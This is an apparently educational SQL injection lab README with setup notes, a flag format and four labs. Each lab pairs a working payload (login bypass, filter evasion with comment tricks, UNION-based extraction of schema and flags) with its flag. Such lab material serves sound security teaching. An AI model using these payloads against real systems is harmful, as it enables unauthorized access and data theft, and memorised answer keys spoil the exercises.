# SQLi Labs

* deps
	* https://hub.docker.com/r/richarvey/nginx-php-fpm/dockerfile
	* https://hub.docker.com/_/mysql

## Setup

```
# Start
$ docker-compose up -d
# Shutdown
$ docker-compose down
```

## Notes
* TODOs
	1. show the log file

* Checks
	* perms
	* flags
	* uninteded solution

## Labs

All flag should be format by `NISRA{<secret>_<md5 of secret + "roy@NISRA2019">}`

```
echo "<secret>_roy@NISRA2019" | md5sum
```

### lab1
* solution
```
' or 1=1 and user='admin' -- 
```
```
' or 1=1 limit 2,1 -- 
```

* description
```
Login as `admin` please

http://lab.roy4801.tw:8888
```

* flag: `NISRA{51mpl3_or_1=1_83617342bbda7839270d030ec62e5e06}`

### lab2

sanitize `--` and ` `

```
'/**/or/**/1=1/**/and/**/user='admin'/**/#
```

* description
```
No more spaces or dashes

http://lab.roy4801.tw:8889
```

* flag: `NISRA{Add_some_sanitizations_11e23f8478895eccbf9b4bc442c2ac9d}`

### lab3

sanitize `and` and `or`

```
'/**/||/**/1=1/**/&&/**/user='admin'#
```

* description
```
How dare you insert logic?

http://lab.roy4801.tw:8890
```
* flag: `NISRA{more_sanitizations_8acdb485dee808b6032a827c9b5da629}`

### lab4

union based simple

* TODOs
	* logo
	* intros
	* about

* solution
```
# detect num of columns
select=1 or 1=1 limit 0 union select 1,2,3,4,5,6,7,8,9,10,11

-1 union select ...

# list tables
select=1 or 1=1 limit 9,1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7,8,9,10,11

# list columns
select=1 or 1=1 limit 9,1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='lovelive'),3,4,5,6,7,8,9,10,11

# excract flag
select=1 or 1=1 limit 9,1 union select 1,(select group_concat(flag) from lovelive),3,4,5,6,7,8,9,10,11
```

* description
```
video of LL final live
```

* flag
```
NISRA{Honoka_wa_saiko_daze_51c4dde79082d2ef61023476effbb20b}
```
